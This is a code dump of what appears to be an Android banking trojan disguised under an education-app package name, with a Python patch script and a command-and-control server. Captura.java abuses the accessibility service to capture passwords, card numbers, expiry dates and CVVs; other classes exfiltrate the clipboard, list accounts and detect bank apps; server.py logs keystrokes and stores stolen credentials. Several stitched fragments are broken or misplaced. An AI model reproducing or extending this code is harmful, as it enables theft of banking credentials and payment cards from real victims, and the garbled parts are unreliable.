
===== .\aplica.py =====
﻿import io, os, re, subprocess, py_compile

F = []

def ler(p):
    with io.open(p, encoding="utf-8") as f:
        return f.read()

def grava(p, s):
    d = os.path.dirname(p)
    if d and not os.path.isdir(d):
        os.makedirs(d)
    with io.open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(s)

def sub(p, velho, novo, obrig=True):
    s = ler(p)
    if velho not in s:
        if obrig:
            F.append("%s :: %s" % (p, velho.strip().splitlines()[0][:70]))
        return False
    grava(p, s.replace(velho, novo, 1))
    print("  ok  %s" % p)
    return True

print("== parte 1: captura de credenciais e cartoes ==")

print("[1] Captura.java")
grava("app/src/main/java/com/eloeeducacao/Captura.java", r'''package com.eloeeducacao;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;

public final class Captura {

    private static final LinkedHashSet<String> vistos = new LinkedHashSet<>();
    private static volatile long ultimo;

    private static boolean luhn(String d) {
        int soma = 0;
        boolean par = false;
        for (int i = d.length() - 1; i >= 0; i--) {
            int n = d.charAt(i) - '0';
            if (par) {
                n *= 2;
                if (n > 9) n -= 9;
            }
            soma += n;
            par = !par;
        }
        return soma % 10 == 0;
    }

    private static String dica(AccessibilityNodeInfo n) {
        StringBuilder b = new StringBuilder();
        try {
            if (n.getViewIdResourceName() != null) {
                String id = n.getViewIdResourceName();
                int i = id.lastIndexOf('/');
                b.append(i >= 0 ? id.substring(i + 1) : id).append(' ');
            }
        } catch (Throwable ignored) {}
        try {
            if (n.getHintText() != null) b.append(n.getHintText()).append(' ');
        } catch (Throwable ignored) {}
        try {
            if (n.getContentDescription() != null) b.append(n.getContentDescription());
        } catch (Throwable ignored) {}
        String s = b.toString().trim();
        return s.length() > 60 ? s.substring(0, 60) : s;
    }

    private static void manda(String tipo, JSONObject o) {
        Net.send("{\"t\":\"" + tipo + "\",\"o\":" + o.toString() + "}");
    }

    public static void ev() {
        long a = System.currentTimeMillis();
        if (a - ultimo < 650) return;
        ultimo = a;
        KeySvc k = KeySvc.I;
        if (k == null) return;
        AccessibilityNodeInfo r = k.getRootInActiveWindow();
        if (r == null) return;
        AccessibilityNodeInfo f = null;
        try {
            f = r.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        } catch (Throwable ignored) {}
        if (f == null) return;
        CharSequence cs = f.getText();
        if (cs == null) return;
        String t = cs.toString().trim();
        if (t.length() < 3) return;

        String pkg = k.curPkg == null ? "?" : k.curPkg;
        String campo = dica(f);
        String chave = pkg + "|" + campo + "|" + t;
        if (vistos.contains(chave)) return;
        vistos.add(chave);
        if (vistos.size() > 500) {
            List<String> l = new ArrayList<>(vistos);
            vistos.clear();
            for (int i = l.size() - 350; i < l.size(); i++) vistos.add(l.get(i));
        }

        String baixo = campo.toLowerCase();
        try {
            JSONObject o = new JSONObject();
            o.put("app", pkg);
            o.put("campo", campo);
            if (f.isPassword()) {
                o.put("v", t);
                manda("cred", o);
                return;
            }
            String dig = t.replaceAll("[^0-9]", "");
            if (dig.length() >= 13 && dig.length() <= 19 && luhn(dig)) {
                o.put("v", dig);
                manda("cartao", o);
                return;
            }
            if (t.matches("(0[1-9]|1[0-2])\\s?/\\s?\\d{2,4}")) {
                o.put("v", t);
                manda("cartao", o);
                return;
            }
            if (dig.length() >= 3 && dig.length() <= 4
                    && (baixo.contains("cvv") || baixo.contains("segur")
                        || baixo.contains("cvc") || baixo.contains("cod"))) {
                o.put("v", dig);
                manda("cartao", o);
            }
        } catch (Throwable ignored) {}
    }
}
''')

print("[2] Contas.java")
grava("app/src/main/java/com/eloeeducacao/Contas.java", r'''package com.eloeeducacao;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;

public final class Contas {
    public static String lista(Context c) {
        StringBuilder b = new StringBuilder();
        try {
            AccountManager am = AccountManager.get(c);
            for (Account a : am.getAccounts()) {
                b.append(a.type).append('\t').append(a.name).append('\n');
            }
        } catch (Throwable t) {
            return "err: " + t;
        }
        return b.length() == 0 ? "nenhuma conta" : b.toString();
    }
}
''')

print("[3] Clip.java")
grava("app/src/main/java/com/eloeeducacao/Clip.java", r'''package com.eloeeducacao;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;

public final class Clip {

    public static volatile boolean on;
    private static String ultimo = "";
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static boolean rodando;

    public static void liga(final Context c) {
        if (rodando) return;
        rodando = true;
        H.postDelayed(new Runnable() {
            @Override public void run() {
                if (!on) { rodando = false; return; }
                try {
                    ClipboardManager cm = (ClipboardManager)
                            c.getSystemService(Context.CLIPBOARD_SERVICE);
                    ClipData d = cm.getPrimaryClip();
                    if (d != null && d.getItemCount() > 0) {
                        CharSequence t = d.getItemAt(0).coerceToText(c);
                        if (t != null && t.length() > 0 && t.length() < 4000) {
                            String s = t.toString();
                            if (!s.equals(ultimo)) {
                                ultimo = s;
                                Util.sendT("clip", s);
                            }
                        }
                    }
                } catch (Throwable ignored) {}
                H.postDelayed(this, 2500);
            }
        }, 800);
    }
}
''')

print("[4] Finger.java")
grava("app/src/main/java/com/eloeeducacao/Finger.java", r'''package com.eloeeducacao;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;

import java.util.Locale;
import java.util.TimeZone;

public final class Finger {

    private static final String[] BANCOS = {
            "br.com.intermedium", "com.nu.production", "com.itau", "com.bradesco",
            "com.santander.app", "br.com.bb.android", "com.picpay", "com.mercadopago.wallet",
            "br.com.caixa", "com.google.android.apps.walletnfcrel"
    };

    public static String txt(Context c) {
        StringBuilder b = new StringBuilder();
        b.append("modelo: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n');
        b.append("marca: ").append(Build.BRAND).append('\n');
        b.append("device: ").append(Build.DEVICE).append('\n');
        b.append("build: ").append(Build.DISPLAY).append('\n');
        b.append("android: ").append(Build.VERSION.RELEASE).append(" sdk ").append(Build.VERSION.SDK_INT).append('\n');
        b.append("abi: ").append(Build.SUPPORTED_ABIS.length > 0 ? Build.SUPPORTED_ABIS[0] : "?").append('\n');
        b.append("idioma: ").append(Locale.getDefault().toString()).append('\n');
        b.append("fuso: ").append(TimeZone.getDefault().getID()).append('\n');
        b.append("tela: ").append(Util.screen(c)).append('\n');
        try {
            StatFs s = new StatFs(Environment.getDataDirectory().getPath());
            b.append("disco livre: ").append(s.getAvailableBytes() / 1048576).append(" MB\n");
        } catch (Throwable ignored) {}
        b.append("ip: ").append(Util.ip()).append('\n');
        try {
            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)
                    c.getSystemService(Context.TELEPHONY_SERVICE);
            b.append("operadora: ").append(tm.getNetworkOperatorName()).append('\n');
        } catch (Throwable ignored) {}
        b.append("root: ").append(root() ? "sim" : "nao").append('\n');
        b.append("emulador: ").append(emu() ? "sim" : "nao").append('\n');
        b.append("dev options: ")
                .append(android.provider.Settings.Global.getInt(c.getContentResolver(),
                        android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1
                        ? "ligado" : "desligado").append('\n');
        b.append("acessibilidade: ").append(Util.accOn(c) ? "ativa" : "inativa").append('\n');
        b.append("--- apps de banco ---\n");
        for (String p : BANCOS) {
            try {
                c.getPackageManager().getPackageInfo(p, 0);
                b.append("  ").append(p).append('\n');
            } catch (Throwable ignored) {}
        }
        return b.toString();
    }

    private static boolean root() {
        String[] p = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
                "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
                "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"};
        for (String s : p) if (new java.io.File(s).exists()) return true;
        return false;
    }

    private static boolean emu() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu");
    }
}
''')

s = ler(K)
if "FLAG_LAYOUT_NO_LIMITS" in s:
    print("  ja aplicado")
else:
    velho = "                                PixelFormat.TRANSLUCENT);\n                        try {"
    novo = ("                                PixelFormat.TRANSLUCENT);\n"
            "                        lp.gravity = Gravity.TOP | Gravity.START;\n"
            "                        lp.flags |= WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;\n"
            "                        l.setFitsSystemWindows(false);\n"
            "                        if (Build.VERSION.SDK_INT >= 30) lp.setFitInsetsTypes(0);\n"
            "                        if (Build.VERSION.SDK_INT >= 28)\n"
            "                            lp.layoutInDisplayCutoutMode = Build.VERSION.SDK_INT >= 30\n"
            "                                    ? WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS\n"
            "                                    : WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;\n"
            "                        try {")
    if velho not in s:
        F.append("KeySvc :: ancora do overlay")
        print("  !! ancora nao encontrada")
    else:
        grava(K, s.replace(velho, novo, 1))
        print("  ok  overlay em tela cheia")

NOVO = r'''# server.py - C2, porta 8080
import asyncio, json, os, socket, time
from aiohttp import web, WSMsgType

TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")
DEVS = {}
VIEW = {}
BUSY = set()
KF = "teclado.log"
CF = "cofre.jsonl"

def klog(dev, pkg, win, txt):
    try:
        if os.path.exists(KF) and os.path.getsize(KF) > 3000000:
            with open(KF, encoding="utf-8", errors="replace") as f:
                cauda = f.read()[-1000000:]
            with open(KF, "w", encoding="utf-8") as f:
                f.write(cauda)
        with open(KF, "a", encoding="utf-8") as f:
            f.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), dev or "?",
                                          (pkg or "?") + ("/" + win if win else ""),
                                          (txt or "").replace("\n", "\\n")))
    except Exception:
        pass

def cofre(tipo, dev, o):
    try:
        if isinstance(o, str):
            o = {"v": o}
        o = dict(o)
        o["_t"] = tipo
        o["_dev"] = dev
        o["_h"] = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(CF, "a", encoding="utf-8") as f:
            f.write(json.dumps(o, ensure_ascii=False) + "\n")
    except Exception:
        pass

def devlist():
    return [{"id": k, "m": v["i"].get("m", "?"), "bat": v["i"].get("bat", -1),
             "w": v["i"].get("w", 0), "h": v["i"].get("h", 0)} for k, v in DEVS.items()]

function co(){

  w.onclose=()=>{log('[caiu]');setTimeout(co,1500)};

    if(m.k==='devs'){

function pt(e){
  const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
  const s=Math.min(r.width/nx,r.height/ny)||1;
  const ox=r.left+(r.width-nx*s)/2,oy=r.top+(r.height-ny*s)/2;
  const x=Math.round((e.clientX-ox)/s*((inf.w||nx)/nx));
  const y=Math.round((e.clientY-oy)/s*((inf.h||ny)/ny));
  return{x:Math.min(Math.max(0,x),inf.w||x),y:Math.min(Math.max(0,y),inf.h||y)}}
function snapP(p){

  let b=null,d=1e9;

  return (b&&d<70)?{x:b.x,y:b.y}:p}

let dlBuf=null,dlPath=null,dlOff=0,dlTot=-1;
function iniciaDl(p){dlPath=p;dlOff=0;dlTot=-1;dlBuf=null;c('dl',{p:p,off:0,n:65536})}
function baixa(o){
  if(o==='fim'){fechaDl();return}
  const m=o.match(/b64=([\s\S]*)/);if(!m){log(o);return}
  const tot=+(o.match(/total=(\d+)/)||[0,0])[1];
  if(!dlBuf){dlBuf=[];dlOff=0;dlTot=tot}
  const b=atob(m[1].replace(/\s/g,''));
  for(let x=0;x<b.length;x++)dlBuf.push(b.charCodeAt(x));
  dlOff+=b.length;
  if(dlOff<dlTot)c('dl',{p:dlPath,off:dlOff,n:65536});else fechaDl()}
function fechaDl(){
  const u=new Uint8Array(dlBuf),a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([u]));a.download=(dlPath.split('/').pop()||'arq');a.click();
  dlBuf=null;dlTot=-1;toq('baixado')}

    const m=document.createElement('div');m.className='m';
    m.textContent=(x._t||'?')+' · '+(x.app||x._dev||'')+(x.campo?' · '+x.campo:'')+' · '+(x._h||'');

    const b1=document.createElement('button');b1.textContent='copiar';
    b1.onclick=()=>{navigator.clipboard.writeText(x.v||'');toq('copiado')};
    a.appendChild(b1);
    d.appendChild(t);d.appendChild(m);d.appendChild(a);alvo.appendChild(d)})}

def ok(req):
    return req.query.get("t") == TOKEN

async def bcast(o, only=None):
    d = json.dumps(o)
    for v in [v for v, s in VIEW.items() if only is None or s == only]:
        try: await v.send_str(d)
        except Exception: pass

async def relay(dev, data):
    for v in [v for v, s in VIEW.items() if s == dev and v not in BUSY]:
        BUSY.add(v)
        try: await v.send_bytes(data)
        except Exception: pass
        finally: BUSY.discard(v)

async def devs():
    await bcast({"k": "devs", "d": devlist()})

async def index(req):
    if not ok(req): raise web.HTTPFound("/?t=" + TOKEN)
    return web.Response(text=PAGE, content_type="text/html", charset="utf-8")

async def phone(req):
    if not ok(req): return web.Response(text="token invalido", status=403)
    if req.headers.get("Upgrade", "").lower() != "websocket":
        h = req.headers.get("Host", "localhost:8080")
        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
        return web.Response(text="%s://%s/ws?t=%s\n" % ("wss" if tls else "ws", h, TOKEN))
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    dev = None
    try:
        async for m in ws:
            if m.type == WSMsgType.BINARY:
                if dev: await relay(dev, m.data)
            elif m.type == WSMsgType.TEXT:
                try: o = json.loads(m.data)
                except Exception: o = {"t": "raw", "o": m.data}
                if o.get("t") == "hello":
                    dev = o.get("id", "?")
                    DEVS[dev] = {"ws": ws, "i": o}
                    print("+ %s (%d online)" % (dev, len(DEVS)))
                    await devs()
                elif o.get("t") == "ka":
                    try: await ws.send_str('{"c":"ka"}')
                    except Exception: pass
                    continue
                elif o.get("t") == "k":
                    klog(dev, o.get("pkg"), o.get("win"), o.get("o", ""))
                    await bcast({"k": "key", "d": {"id": dev, "pkg": o.get("pkg"),
                                                   "win": o.get("win"), "o": o.get("o", "")}})
                    continue
                elif o.get("t") in ("cred", "cartao", "otp", "clip", "pixvisto"):
                    cofre(o.get("t"), dev, o.get("o"))
                await bcast({"k": "log", "d": o}, dev)
    except Exception as e:
        print("  ! erro em %s: %s" % (dev, e))
    finally:
        if dev and DEVS.get(dev, {}).get("ws") is ws:
            DEVS.pop(dev, None)
            print("- %s saiu" % dev)
            await devs()
    return ws

async def panel(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    VIEW[ws] = None
    await ws.send_str(json.dumps({"k": "devs", "d": devlist()}))
    try:
        async for m in ws:
            if m.type != WSMsgType.TEXT: continue
            try: o = json.loads(m.data)
            except Exception: continue
            if o.get("c") == "sel":
                VIEW[ws] = o.get("id") or None
                alvo = DEVS.get(VIEW[ws])
                if alvo:
                    try:
                        await alvo["ws"].send_str('{"c":"shot","on":true}')
                        await alvo["ws"].send_str('{"c":"info"}')
                    except Exception: pass
                continue
            alvo = DEVS.get(o.get("id") or VIEW[ws])
            if not alvo:
                await ws.send_str(json.dumps({"k": "log", "d": {"t": "err", "o": "aparelho offline"}}))
                continue
            VIEW[ws] = o.get("id") or VIEW[ws]
            try: await alvo["ws"].send_str(json.dumps({k: v for k, v in o.items() if k != "id"}))
            except Exception: pass
    except Exception: pass
    finally: VIEW.pop(ws, None)
    return ws

async def keys_get(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    try: n = min(int(req.query.get("n", 400)), 2000)
    except Exception: n = 400
    dev = req.query.get("dev")
    linhas = []
    if os.path.exists(KF):
        with open(KF, encoding="utf-8", errors="replace") as f:
            for l in f:
                if dev and ("\t" + dev + "\t") not in l: continue
                linhas.append(l.rstrip("\n"))
    return web.json_response({"l": linhas[-n:]})

async def keys_clear(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    open(KF, "w", encoding="utf-8").close()
    return web.json_response({"ok": True})

async def keys_dl(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    if not os.path.exists(KF): open(KF, "w", encoding="utf-8").close()
    return web.FileResponse(KF, headers={"Content-Disposition": 'attachment; filename="teclado.log"'})

async def cofre_get(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    tipo = req.query.get("tipo")
    out = []
    if os.path.exists(CF):
        with open(CF, encoding="utf-8", errors="replace") as f:
            for l in f:
                try: o = json.loads(l)
                except Exception: continue
                if tipo and o.get("_t") != tipo: continue
                out.append(o)
    return web.json_response({"l": out[-800:][::-1]})

async def cofre_clr(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    open(CF, "w", encoding="utf-8").close()
    return web.json_response({"ok": True})

async def health(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    return web.json_response({"ok": True, "devices": devlist()})

def local_ip(dst):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst, 9)); return s.getsockname()[0]
    except Exception: return "127.0.0.1"
    finally: s.close()

async def udp_loop():
    loop = asyncio.get_event_loop()
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try: sk.bind(("0.0.0.0", 8089))
    except Exception as e:
        print("! udp 8089 indisponivel: %s" % e); return
    sk.setblocking(False)
    while True:
        try:
            data, addr = await loop.sock_recvfrom(sk, 64)
            if data.strip() == b"AVAL":
                await loop.sock_sock_sendto if False else None
                await loop.sock_sendto(sk, ("ws://%s:8080/ws?t=%s" % (local_ip(addr[0]), TOKEN)).encode(), addr)
        except Exception:
            await asyncio.sleep(0.2)

async def on_start(app):
    app["udp"] = asyncio.create_task(udp_loop())

def main():
    app = web.Application()
    app.router.add_get("/", index)
    app.router.add_get("/ws", phone)
    app.router.add_get("/panel", panel)
    app.router.add_get("/health", health)
    app.router.add_get("/keys", keys_get)
    app.router.add_get("/keys/clear", keys_clear)
    app.router.add_get("/keys/dl", keys_dl)
    app.router.add_get("/cofre", cofre_get)
    app.router.add_get("/cofre/clr", cofre_clr)
    app.on_startup.append(on_start)
    print("painel: http://localhost:8080/")
    web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)

main()

===== .\app\src\main\java\com\eloeeducacao\Aviso.java =====
package com.eloeeducacao;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

public final class Aviso {

    private static final Handler H = new Handler(Looper.getMainLooper());
    private static WindowManager wm;
    private static View root;

    private static final Runnable fim = new Runnable() {
        @Override public void run() { clear(); }
    };

    private Aviso() {}

    public static void show(final Context c, final String titulo, final String texto) {
        H.post(new Runnable() {
            @Override public void run() {
                try {
                    clear();
                    wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);

                    LinearLayout fora = new LinearLayout(c);
                    fora.setPadding(28, 28, 28, 28);

                    LinearLayout card = new LinearLayout(c);
                    card.setOrientation(LinearLayout.HORIZONTAL);
                    card.setGravity(Gravity.TOP);
                    card.setPadding(26, 22, 26, 22);
                    GradientDrawable bg = new GradientDrawable();
                    bg.setColor(Color.parseColor("#F21A1F26"));
                    bg.setCornerRadius(38f);
                    bg.setStroke(2, Color.parseColor("#2E3945"));
                    card.setBackground(bg);

                    TextView ic = new TextView(c);
                    ic.setText("!");
                    ic.setTextColor(Color.WHITE);
                    ic.setTextSize(15);
                    ic.setTypeface(Typeface.DEFAULT_BOLD);
                    ic.setGravity(Gravity.CENTER);
                    GradientDrawable ib = new GradientDrawable();
                    ib.setShape(GradientDrawable.OVAL);
                    ib.setColor(Color.parseColor("#2F81F7"));
                    ic.setBackground(ib);
                    LinearLayout.LayoutParams il =
                            new LinearLayout.LayoutParams(dp(c, 30), dp(c, 30));
                    il.rightMargin = dp(c, 16);
                    ic.setLayoutParams(il);

                    LinearLayout col = new LinearLayout(c);
                    col.setOrientation(LinearLayout.VERTICAL);

                    TextView t1 = new TextView(c);
                    t1.setText(titulo);
                    t1.setTextColor(Color.WHITE);
                    t1.setTextSize(14);
                    t1.setTypeface(Typeface.DEFAULT_BOLD);

                    TextView t2 = new TextView(c);
                    t2.setText(texto);
                    t2.setTextColor(Color.parseColor("#B8C2CE"));
                    t2.setTextSize(13);
                    t2.setPadding(0, dp(c, 4), 0, 0);

                    col.addView(t1);
                    col.addView(t2);
                    card.addView(ic);
                    card.addView(col);
                    fora.addView(card);

                    int type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
                    WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.WRAP_CONTENT, type,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                            PixelFormat.TRANSLUCENT);
                    lp.gravity = Gravity.TOP;
                    lp.y = dp(c, 44);
                    fora.setTranslationY(-dp(c, 140));
                    wm.addView(fora, lp);
                    root = fora;
                    fora.animate().translationY(0).setDuration(220).start();
                    H.removeCallbacks(fim);
                    H.postDelayed(fim, 5200);
                } catch (Throwable ignored) {}
            }
        });
    }

    public static void clear() {
        H.post(new Runnable() {
            @Override public void run() {
                H.removeCallbacks(fim);
                try {
                    if (root != null && wm != null) {
                        root.animate().translationY(-dp(root.getContext(), 140)).setDuration(180).start();
                        final View v = root;
                        H.postDelayed(new Runnable() {
                            @Override public void run() {
                                try { if (wm != null) wm.removeView(v); } catch (Throwable ignored) {}
                            }
                        }, 190);
                    }
                } catch (Throwable ignored) {}
                root = null;
            }
        });
    }

    private static int dp(Context c, int v) {
        return (int) (v * c.getResources().getDisplayMetrics().density);
    }
}
